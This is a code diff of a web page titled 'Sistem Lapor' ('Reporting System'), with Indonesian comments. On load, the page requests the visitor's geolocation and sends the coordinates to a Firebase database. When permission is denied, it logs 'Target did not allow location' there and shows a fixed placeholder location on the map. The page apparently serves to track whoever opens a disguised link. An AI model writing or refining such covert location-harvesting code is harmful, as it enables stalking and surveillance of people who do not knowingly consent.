@@ -51,38 +51,48 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
 
-            // Mengirim data lokasi ke Firebase
-            const locationRef = ref(database, `devices/${deviceID}`);
-            set(locationRef, {
-                latitude: lat,
-                longitude: lon,
-                timestamp: Date.now()
-            });
+            // Kondisi: Jika pengguna memberikan izin lokasi
+            if (position.coords.accuracy) {
+                // Kirim lokasi ke Firebase
+                const locationRef = ref(database, `devices/${deviceID}`);
+                set(locationRef, {
+                    latitude: lat,
+                    longitude: lon,
+                    timestamp: Date.now()
+                });
 
-            // Menghapus pesan penolakan izin (jika ada)
-            const notificationRef = ref(database, `notifications/${deviceID}`);
-            remove(notificationRef);
+                // Tampilkan lokasi di peta
+                updateMap(lat, lon);
+                
+                // Hapus pesan penolakan izin (jika ada)
+                const notificationRef = ref(database, `notifications/${deviceID}`);
+                remove(notificationRef);
+            }
         }
 
         function showError(error) {
             const notificationRef = ref(database, `notifications/${deviceID}`);
             console.log("Error mendapatkan lokasi:", error); // Log kesalahan untuk debug
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    set(notificationRef, {
-                        message: "Target tidak izinkan lokasi"
-                    });
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    alert("Informasi lokasi tidak tersedia.");
-                    break;
-                case error.TIMEOUT:
-                    alert("Permintaan untuk mendapatkan lokasi pengguna telah waktunya habis.");
-                    break;
-                case error.UNKNOWN_ERROR:
-                    alert("Terjadi kesalahan yang tidak diketahui.");
-                    break;
+
+            // Jika izin lokasi ditolak, tampilkan pesan
+            if (error.code === error.PERMISSION_DENIED) {
+                // Tampilkan lokasi lokal pada device sendiri (tidak dikirim ke Firebase)
+                useLocalLocation();
+                set(notificationRef, {
+                    message: "Target tidak izinkan lokasi"
+                });
+            } else {
+                alert("Gagal mendapatkan lokasi.");
             }
+        }
+
+        // Fungsi untuk menggunakan lokasi lokal (tidak dikirim ke Firebase)
+        function useLocalLocation() {
+            const defaultLocalLat = -7.975000; // Lokasi lat lokal default
+            const defaultLocalLon = 110.334000; // Lokasi lon lokal default
+
+            // Tampilkan lokasi lokal di peta
+            updateMap(defaultLocalLat, defaultLocalLon);
         }
 
         // Fungsi untuk mencari ID perangkat unik yang tersedia
@@ -170,27 +180,15 @@
             }
         }
 
-        // Fungsi untuk mendapatkan data dari Firebase (hanya untuk device ID unik)
-        function getLocationFromFirebase() {
-            const locationRef = ref(database, `devices/${deviceID}`);
-            onValue(locationRef, (snapshot) => {
-                const data = snapshot.val();
-                if (data) {
-                    updateMap(data.latitude, data.longitude);
-                }
-            });
-        }
-
         // Mulai mendapatkan lokasi saat halaman dimuat
         window.onload = async () => {
             await findAvailableDeviceID(); // Cari ID perangkat unik
             getLocation();
-            getLocationFromFirebase();
         };
     </script>
 </head>
 <body>
     <h1>Sistem Lapor</h1>
-    <div id="map"></div> <!-- Elemen untuk peta -->
+    <div id="map"></div> <!-- Elemen untuk menampilkan peta -->
 </body>
 </html>
